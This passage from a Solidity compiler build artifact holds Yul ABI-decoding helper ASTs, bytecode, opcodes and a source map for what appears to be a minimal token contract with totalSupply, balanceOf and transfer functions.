																			"nodeType": "YulIdentifier",
																			"src": "250:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "250:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "275:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "246:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "246:32:2"
															},
															"nodeType": "YulIf",
															"src": "243:2:2"
														},
														{
															"nodeType": "YulBlock",
															"src": "305:128:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "320:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "334:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "324:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "349:74:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "395:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "406:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "391:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "391:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "415:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_uint256_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "359:31:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "359:64:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "349:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_uint256_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "203:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "214:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "226:6:2",
														"type": ""
													}
												],
												"src": "156:284:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "491:32:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "501:16:2",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "512:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "501:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "473:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "483:7:2",
														"type": ""
													}
												],
												"src": "446:77:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "572:79:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "629:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "638:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "641:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "631:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "631:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "631:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "595:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "620:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_uint256",
																					"nodeType": "YulIdentifier",
																					"src": "602:17:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "602:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "592:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "592:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "585:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "585:43:2"
															},
															"nodeType": "YulIf",
															"src": "582:2:2"
														}
													]
												},
												"name": "validator_revert_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "565:5:2",
														"type": ""
													}
												],
												"src": "529:122:2"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_uint256_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_uint256_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060405161055438038061055483398181016040528101906100329190610095565b8060018190556000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550506100df565b60008151905061008f816100c8565b92915050565b6000602082840312156100a757600080fd5b60006100b584828501610080565b91505092915050565b6000819050919050565b6100d1816100be565b81146100dc57600080fd5b50565b610466806100ee6000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806318160ddd1461004657806370a0823114610064578063a9059cbb14610094575b600080fd5b61004e6100c4565b60405161005b91906102e6565b60405180910390f35b61007e60048036038101906100799190610248565b6100ca565b60405161008b91906102e6565b60405180910390f35b6100ae60048036038101906100a99190610271565b610112565b6040516100bb91906102cb565b60405180910390f35b60015481565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600080826000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461015f9190610357565b101561016a57600080fd5b816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546101b89190610357565b92505081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461020d9190610301565b925050819055506001905092915050565b60008135905061022d81610402565b92915050565b60008135905061024281610419565b92915050565b60006020828403121561025a57600080fd5b60006102688482850161021e565b91505092915050565b6000806040838503121561028457600080fd5b60006102928582860161021e565b92505060206102a385828601610233565b9150509250929050565b6102b68161039d565b82525050565b6102c5816103c9565b82525050565b60006020820190506102e060008301846102ad565b92915050565b60006020820190506102fb60008301846102bc565b92915050565b600061030c826103c9565b9150610317836103c9565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0382111561034c5761034b6103d3565b5b828201905092915050565b6000610362826103c9565b915061036d836103c9565b9250828210156103805761037f6103d3565b5b828203905092915050565b6000610396826103a9565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b61040b8161038b565b811461041657600080fd5b50565b610422816103c9565b811461042d57600080fd5b5056fea26469706673582212202c7a7a3b801135e796914b927415438ed61c53fb783151f063675b537975d11564736f6c63430008010033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x554 CODESIZE SUB DUP1 PUSH2 0x554 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x95 JUMP JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP PUSH2 0xDF JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x8F DUP2 PUSH2 0xC8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xA7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xB5 DUP5 DUP3 DUP6 ADD PUSH2 0x80 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xD1 DUP2 PUSH2 0xBE JUMP JUMPDEST DUP2 EQ PUSH2 0xDC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x466 DUP1 PUSH2 0xEE PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x18160DDD EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x64 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x94 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0xC4 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5B SWAP2 SWAP1 PUSH2 0x2E6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7E PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x79 SWAP2 SWAP1 PUSH2 0x248 JUMP JUMPDEST PUSH2 0xCA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x8B SWAP2 SWAP1 PUSH2 0x2E6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xAE PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xA9 SWAP2 SWAP1 PUSH2 0x271 JUMP JUMPDEST PUSH2 0x112 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xBB SWAP2 SWAP1 PUSH2 0x2CB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x15F SWAP2 SWAP1 PUSH2 0x357 JUMP JUMPDEST LT ISZERO PUSH2 0x16A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x1B8 SWAP2 SWAP1 PUSH2 0x357 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x20D SWAP2 SWAP1 PUSH2 0x301 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x22D DUP2 PUSH2 0x402 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x242 DUP2 PUSH2 0x419 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x25A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x268 DUP5 DUP3 DUP6 ADD PUSH2 0x21E JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x284 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x292 DUP6 DUP3 DUP7 ADD PUSH2 0x21E JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x2A3 DUP6 DUP3 DUP7 ADD PUSH2 0x233 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0x2B6 DUP2 PUSH2 0x39D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x2C5 DUP2 PUSH2 0x3C9 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2E0 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2AD JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2FB PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2BC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x30C DUP3 PUSH2 0x3C9 JUMP JUMPDEST SWAP2 POP PUSH2 0x317 DUP4 PUSH2 0x3C9 JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x34C JUMPI PUSH2 0x34B PUSH2 0x3D3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x362 DUP3 PUSH2 0x3C9 JUMP JUMPDEST SWAP2 POP PUSH2 0x36D DUP4 PUSH2 0x3C9 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x380 JUMPI PUSH2 0x37F PUSH2 0x3D3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x396 DUP3 PUSH2 0x3A9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x40B DUP2 PUSH2 0x38B JUMP JUMPDEST DUP2 EQ PUSH2 0x416 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x422 DUP2 PUSH2 0x3C9 JUMP JUMPDEST DUP2 EQ PUSH2 0x42D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x2C PUSH27 0x7A3B801135E796914B927415438ED61C53FB783151F063675B5379 PUSH22 0xD11564736F6C63430008010033000000000000000000 ",
							"sourceMap": "60:522:0:-:0;;;150:104;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;234:14;220:11;:28;;;197:8;:20;206:10;197:20;;;;;;;;;;;;;;;:51;;;;150:104;60:522;;7:143:2;;95:6;89:13;80:22;;111:33;138:5;111:33;:::i;:::-;70:80;;;;:::o;156:284::-;;275:2;263:9;254:7;250:23;246:32;243:2;;;291:1;288;281:12;243:2;334:1;359:64;415:7;406:6;395:9;391:22;359:64;:::i;:::-;349:74;;305:128;233:207;;;;:::o;446:77::-;;512:5;501:16;;491:32;;;:::o;529:122::-;602:24;620:5;602:24;:::i;:::-;595:5;592:35;582:2;;641:1;638;631:12;582:2;572:79;:::o;60:522:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:3021:2",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "59:87:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "69:29:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "91:6:2"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "78:12:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "78:20:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "69:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "134:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "107:26:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "107:33:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "107:33:2"
														}
													]
												},
												"name": "abi_decode_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "37:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "45:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "53:5:2",
														"type": ""
													}
												],
												"src": "7:139:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "204:87:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "214:29:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "236:6:2"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "223:12:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "223:20:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "214:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "279:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "252:26:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "252:33:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "252:33:2"
														}
													]
												},
												"name": "abi_decode_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "182:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "190:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "198:5:2",
														"type": ""
													}
												],
												"src": "152:139:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "363:196:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "409:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "418:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "421:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "411:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "411:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "411:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "384:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "393:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "380:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "380:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "405:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "376:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "376:32:2"
															},
															"nodeType": "YulIf",
															"src": "373:2:2"
														},
														{
															"nodeType": "YulBlock",
															"src": "435:117:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "450:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "464:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "454:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "479:63:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "514:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "525:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "510:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "510:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "534:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "489:20:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "489:53:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "479:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "333:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "344:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "356:6:2",
														"type": ""
													}
												],
												"src": "297:262:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "648:324:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "694:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "703:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "706:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "696:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "696:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "696:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "669:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "678:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "665:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "665:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "690:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "661:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "661:32:2"
															},
															"nodeType": "YulIf",
															"src": "658:2:2"
														},
														{
															"nodeType": "YulBlock",
															"src": "720:117:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "735:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "749:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "739:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "764:63:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "799:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "810:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "795:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "795:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "819:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "774:20:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "774:53:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "764:6:2"
																		}
																	]
																}
															]
														},
														{
															"nodeType": "YulBlock",
															"src": "847:118:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "862:16:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "876:2:2",
																		"type": "",
																		"value": "32"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "866:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "892:63:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "927:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "938:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "923:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "923:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "947:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "902:20:2"
																		},
